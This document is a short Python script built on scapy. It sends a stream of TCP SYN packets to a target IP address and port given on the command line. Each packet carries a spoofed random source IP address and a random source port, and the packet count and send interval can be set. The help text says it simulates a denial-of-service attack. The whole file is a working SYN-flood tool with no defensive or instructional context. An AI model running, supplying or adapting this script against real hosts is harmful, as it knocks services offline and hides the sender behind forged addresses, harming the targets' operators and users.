from scapy.all import *
import argparse
import random
import time

def send_syn_flood(target_ip, target_port, packet_count, interval):
    print(f"Sending {packet_count} SYN packets to {target_ip}:{target_port}")

    for i in range(packet_count):
        # Generate a random source IP address for each packet
        src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        # Generate a random source port for each packet
        sport = random.randint(1024, 65535)

        # Craft the SYN packet
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=sport, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        packet = ip/tcp

        # Send the packet and capture the response
        send(packet, verbose=False)

        # Display packet details
        print(f"Packet {i+1}:")
        print(f"  Source IP: {src_ip}")
        print(f"  Source Port: {sport}")
        print(f"  Destination IP: {target_ip}")
        print(f"  Destination Port: {target_port}")
        print(f"  Protocol: TCP (SYN)")
        print(f"  Packet Status: Sent")

        # Wait for the specified interval
        time.sleep(interval)

    print("Packets sent.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send a large amount of SYN packets to simulate a DOS attack.")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port number")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Number of packets to send")
    parser.add_argument("-i", "--interval", type=float, default=0.01, help="Interval between packets (seconds)")

    args = parser.parse_args()

    send_syn_flood(args.target_ip, args.target_port, args.count, args.interval)

